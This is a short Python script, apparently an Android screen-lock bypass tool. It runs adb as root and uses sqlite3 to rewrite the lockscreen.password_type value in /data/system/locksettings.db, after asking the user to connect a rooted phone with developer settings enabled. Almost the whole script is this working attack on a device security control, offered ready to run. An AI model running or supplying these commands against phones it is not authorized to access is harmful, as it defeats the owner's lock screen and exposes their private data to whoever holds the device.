#!/usr/bin/env python
import os

def breakpassword ():
	os.system('cls' if os.name == 'nt' else 'clear')
	print("Connect the phone via USB, ensure Developer seetings are on and root is enabled. Press any key when ready")
	input()
	os.system("bin\\adb.exe root" if os.name == 'nt' else "adb root")
	os.system("bin\\adb.exe shell \"su -c \\\"sqlite3 /data/system/locksettings.db \\\\\"update locksettings set value=65536 where name='lockscreen.password_type';\\\\\"\\\"\"" if os.name == 'nt' else "adb shell \"su -c \\\"sqlite3 /data/system/locksettings.db \\\\\\\"update locksettings set value=65536 where name='lockscreen.password_type';\\\\\\\"\\\"\"" )
	print("bin\\adb.exe shell \"su -c \\\"sqlite3 /data/system/locksettings.db \\\\\"update locksettings set value=65536 where name='lockscreen.password_type';\\\\\"\\\"\"" if os.name == 'nt' else "adb shell \"su -c \\\"sqlite3 /data/system/locksettings.db \\\\\\\"update locksettings set value=65536 where name='lockscreen.password_type';\\\\\\\"\\\"\"" )
	input()
